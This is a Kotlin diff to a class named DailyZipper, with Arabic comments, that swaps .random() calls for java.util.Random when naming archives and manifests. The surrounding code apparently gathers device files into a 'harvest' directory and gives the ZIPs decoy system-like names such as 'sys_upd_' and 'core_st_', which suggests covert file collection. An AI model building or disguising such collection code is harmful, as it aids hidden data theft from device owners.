@@ -89,7 +89,7 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ========== دوال مساعدة آمنة تماماً (بدون أقواس مربعة) ==========
+    // ========== دوال مساعدة آمنة للخرائط (بدون أي [] أو .get) ==========
     private fun getMapValue(map: Any?, key: String): Any? {
         if (map is Map<*, *>) {
             for (entry in map.entries) {
@@ -238,12 +238,15 @@ class DailyZipper(
         }
     }
 
+    // ========== دالة توليد اسم ZIP مع إصلاح مشكلة .random() ==========
     private fun generateZipName(): String {
         val prefixes = arrayOf("cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_")
         val dateStr = SimpleDateFormat("yyMMdd", Locale.US).format(Date())
         val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-        val suffix = (1..6).map { chars.random() }.joinToString("")
-        val prefix = prefixes.random()
+        // ✅ استبدال chars.random() بـ Random().nextInt()
+        val random = Random()
+        val suffix = (1..6).map { chars[random.nextInt(chars.length)] }.joinToString("")
+        val prefix = prefixes[random.nextInt(prefixes.size)]
         return "${prefix}${dateStr}_${deviceTag}_$suffix.zip"
     }
 
@@ -494,9 +497,12 @@ class DailyZipper(
                         put("files", filesArr)
                     }
 
+                    // ✅ استبدال (1000..9999).random() بـ Random().nextInt()
+                    val random = Random()
+                    val randomNum = 1000 + random.nextInt(9000)
                     manifestFile = File(
                         harvestDir,
-                        "manifest_${System.currentTimeMillis()}_${(1000..9999).random()}.json"
+                        "manifest_${System.currentTimeMillis()}_$randomNum.json"
                     )
                     manifestFile.writeText(manifestJson.toString(2), Charsets.UTF_8)
 
